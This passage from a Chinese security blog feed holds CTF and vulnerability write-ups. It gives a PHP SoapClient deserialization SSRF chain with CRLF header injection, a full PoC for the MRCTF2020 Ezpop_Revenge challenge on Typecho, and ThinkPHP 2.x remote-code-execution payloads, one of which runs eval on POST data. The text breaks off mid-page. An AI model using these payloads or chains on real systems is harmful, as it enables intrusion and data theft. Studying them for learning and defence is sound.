alt="image-20221004112010496"></p><p>可以看到成功进行了ssrf</p><p>配合CRLF可以插入任意HTTP头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)。CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</span><br></pre></td></tr></table></figure><p><strong>test2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;test\r\nCookie: PHPSESSID=test&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041123899.png" alt="image-20221004112300785"></p><p>成功插入自定义的<strong>Cookie</strong></p><p>还有一个需要注意的点，因为我们传输的是POST数据，所以这里还需要令<code>Content-Type</code>的值为<code>application/x-www-form-urlencoded</code></p><p>这里因为<code>Content-Type</code>在<code>User-Agent</code>的下面,所以我们可以通过更改<code>User-Agent</code>的值来替换掉原来的<code>Content-Type</code>的值</p><p><strong>test3.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=test&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Test^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041126754.png" alt="image-20221004112610648"></p><h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>打开题目，是一个Typecho写的页面，dirsearch扫出<a href="http://www.zip/">www.zip</a></p><p><strong>flag.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的这是个ssrf+反序列化的题目，所以想到利用<code>SoapClient</code>类来实现<code>ssrf</code>，当访问后，会把<code>flag</code>写进访问的<code>session</code>中</p><p>在<code>usr\plugins\HelloWorld\Plugin.php</code>中找到触发点</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041205415.png" alt="image-20221004120549336"></p><p>如果存在<code>$_REQUEST[&#39;admin&#39;]</code>，就会打印出session，正好flag就在session中，同时将对传入的<code>Coincid3nc3</code>参数进行反序列化</p><p>同样在Plugin.php中</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041207290.png" alt="image-20221004120740237"></p><p>在HelloWorld_DB类中发现了<code>__wakeup</code>魔术方法,在<code>__wakeup()</code>方法内实例化了<code>Typecho_Db</code>类</p><p>跟进到<code>/var/Typecho/Db.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">      <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Typecho_Db_Exception</span>(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;f</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//实例化适配器对象</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中$adapterName被当成字符串拼接，就会触发<code>__toString</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 数据库适配器 */</span></span><br><span class="line"><span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()当一个对象被当作字符串对待的时候，会触发这个魔术方法</span><br></pre></td></tr></table></figure><p>全局搜索<code>__toString</code>，跟进到<code>/var/Typecho/Db/Query.php</code></p><p>其中有用的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">SELECT</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_adapter-&gt;<span class="title function_ invoke__">parseSelect</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">INSERT</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">DELETE</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">UPDATE</span>:</span><br><span class="line">                <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                        <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$columns</span>)</span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>case Typecho_Db::SELECT=SELECT</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="variable constant_">DELETE</span> = <span class="string">&#x27;DELETE&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果令<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>为SELECT，就能执行<code>return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</code>，也就是调用<code>$this-&gt;_adapter</code>的<code>parseSelect()</code>方法，此时，令<code>$this-&gt;_adapter</code>为<strong>SoapClient</strong>类，由于SoapClient类中没有parseSelect()方法，就能触发了<code>SoapClient</code>的<code>__call()</code>魔术方法，而<code>__call()</code>正是实现SSRF的关键，关于<code>SoapClient</code>类实现ssrf</p><p>所以整体思路就有了</p><h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>1、进行反序列化的时候，就会触发<code>__wakeup</code>魔术方法，在<code>__wakeup</code>方法里实例化了<code>Typecho_Db</code>类</p><p>2、<code>Typecho_Db</code>类中将一个对象当作字符串拼接触发了<code>__toString</code>魔术方法</p><p>3、在<code>__toString()</code>内，如果令<code>$_sqlPreBuild[&#39;action&#39;]</code>为<code>SELECT</code>就会触发<code>$_adapter</code>的<code>parseSelect()</code>方法</p><p>4、令<code>$_adapter</code>为<code>SoapClient</code>类，由于SoapClient类中没有parseSelect()方法，就会触发<code>SoapClient</code>的<code>__call()</code>魔术方法，实现ssrf</p><h4 id="调用点"><a href="#调用点" class="headerlink" title="调用点"></a>调用点</h4><p>在<code>/var/Typecho/Plugin.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title class_">Helper</span>::<span class="title function_ invoke__">addRoute</span>(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>/page_admin</code>的时候，会自动加载<code>HelloWorld_Plugin</code>类，而且会自动调用<code>action</code>函数</p><h4 id="exp解析"><a href="#exp解析" class="headerlink" title="exp解析"></a>exp解析</h4><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=a86167abe7j6mjojp3o5dvkn47&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$z</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;aaa^^&#x27;</span> . <span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>, <span class="variable">$headers</span>), <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_sqlPreBuild = <span class="keyword">array</span>(<span class="string">&quot;action&quot;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_adapter = <span class="variable">$z</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;coincidence = [<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Db_Query</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面这个替换函数不知道是来自哪个师傅的</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$newstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/00/&#x27;</span>, <span class="variable">$arr</span>[<span class="variable">$i</span>])) &#123;</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$i</span> - <span class="number">2</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, <span class="variable">$arr</span>[<span class="variable">$i</span> - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) - <span class="number">1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newstr</span> .= <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$newstr</span> .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$newstr</span> .= <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newstr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HelloWorld</span>_DB();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">decorate</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$f</span>);</span><br></pre></td></tr></table></figure><p><strong>1.将小写的s换成大写的S，并添加\00</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是因为private属性会在反序列化的生成一个标志性的%00</span><br><span class="line">1.PHP在序列化时属性为private和protected的变量会引入不可见字符\x00，而在输出和复制的时候可能会遗失这些信息，导致反序列化的时候出现错误。</span><br><span class="line">2.private属性序列化的时候会引入两个\x00，这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至会导致截断，protected属性会引入\x00*\x00。</span><br><span class="line">3.在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</span><br></pre></td></tr></table></figure><p><strong>2.添加<code>\r\n</code>，base64编码</strong></p><p>因为想要带SESSION出来，必须要把自己的PHPSESSID传过去，然而SOAP并不能设置Cookie，因此需要<strong>CRLF</strong>。SoapClient可以设置UA，所以在UA后加上\r\nCookie: PHPSESSID&#x3D;xxx就能添加一个Cookie，就能带上session.<br>自己的PHPSESSID就是访问<code>/page_admin</code>得到的</p><p>生成poc后，在<code>/page_admin</code>处POST我们POC生成的payload</p><p>就能利用soap类去访问flag.php从而实现SSRF把flag带到session中，最后带上admin参数并将session替换成自己的PHPSESION即可得到flag</p><p><img src="https://i0.hdslb.com/bfs/album/01ab6fbe40ac6c9367decbf170de3db45242c4d1.png"></p>]]></content>
      
      
      <categories>
          
          <category> php原生类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php原生类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp各版本漏洞分析及例题</title>
      <link href="/2021/12/19/Thinkphp%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
      <url>/2021/12/19/Thinkphp%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-x-任意代码执行"><a href="#ThinkPHP-2-x-任意代码执行" class="headerlink" title="ThinkPHP 2.x(任意代码执行)"></a>ThinkPHP 2.x(任意代码执行)</h1><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?s=/Index/index/jammny/$&#123;@phpinfo()&#125;</span><br><span class="line">http://xxx/?s=/Index/index/jammny/$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure><h1 id="Thinkphp3-2-3"><a href="#Thinkphp3-2-3" class="headerlink" title="Thinkphp3.2.3"></a>Thinkphp3.2.3</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>composer</strong>一把梭,可参考<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">文章</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/thinkphp=3.2.3 tp3</span><br></pre></td></tr></table></figure><p>之后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp3/</span><br></pre></td></tr></table></figure><p>即可</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>找起点，<code>\tp3\ThinkPHP\Library\Think\Image\Driver\Imagick.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/3f63862ef70f482e9c9be462a26cd782.png" alt="在这里插入图片描述"></p><p>其中**$this-&gt;img<strong>是可控的，调用了</strong>destroy**函数，这里全局搜索，跟进到<code>\tp3\ThinkPHP\Library\Think\Session\Driver\Memcache.class.php</code>,</p><p><img 